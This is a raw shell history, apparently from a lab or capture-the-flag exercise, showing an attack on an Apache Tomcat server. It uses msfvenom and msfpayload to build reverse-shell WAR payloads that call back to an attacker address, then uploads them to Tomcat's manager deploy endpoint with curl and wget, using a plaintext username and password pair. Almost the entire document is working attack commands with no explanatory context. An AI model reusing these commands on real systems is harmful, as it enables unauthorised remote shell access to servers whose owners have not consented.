  957  msfpayload linux/x86/shell_reverse_tcp LHOST=10.4.27.248 W > app.war
  959  msfvenom -p java/shell_reverse_tcp lhost=10.4.27.248 lport=4242 -f war -o app.war
  961  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.27.248 LPORT=4243 -f war > shell.war
  994  wget http://webdev:Hgj3LA$02D$Fa@21@hack2:8080/manager/text/deploy/?path=h3&war=file:/warpath -O -q
  995  wget http://webdev:Hgj3LA$02D$Fa@21@hack2:8080/manager/text/deploy/?path=h3&war=file:/warpath -q
  996  wget http://webdev:Hgj3LA$02D$Fa@21@hack2:8080/manager/text/deploy/?path=h3&war=file:/warpath
  997  wget http://webdev:Hgj3LA$02D\$Fa@21@hack2:8080/manager/text/deploy/?path=h3\&war=file:/warpath -q
  998  curl -v -u webdev:Hgj3LA$02D$Fa@21 -T app.war 'http://hack2:8080/manager/text/deploy?path=/h3&update=true'
  999  curl -v -u webdev:Hgj3LA$02D\$Fa@21 -T app.war 'http://10.10.117.69:8080/manager/text/deploy?path=/h3&update=true'
 1000  curl -v -u webdev:Hgj3LA$02D$Fa@21 -T app.war 'http://10.10.117.69:8080/manager/text/deploy?path=/h3&update=true'
 1001  curl -v -u 'webdev:Hgj3LA$02D$Fa@21' -T app.war 'http://10.10.117.69:8080/manager/text/deploy?path=/h3&update=true'
 1002  jar -xvf app.war 
 1036  curl -v -u 'webdev:Hgj3LA$02D$Fa@21' -T app.war 'http://10.10.246.136:8080/manager/text/deploy?path=/h3&update=true'
 1051  curl -v -u 'webdev:Hgj3LA$02D$Fa@21' -T app.war 'http://10.10.178.239:8080/manager/text/deploy?path=/h3&update=true'

jar cmvf META-INF/MANIFEST.MF app2.jar JavaAppendToFile.class JavaAppendToFile.java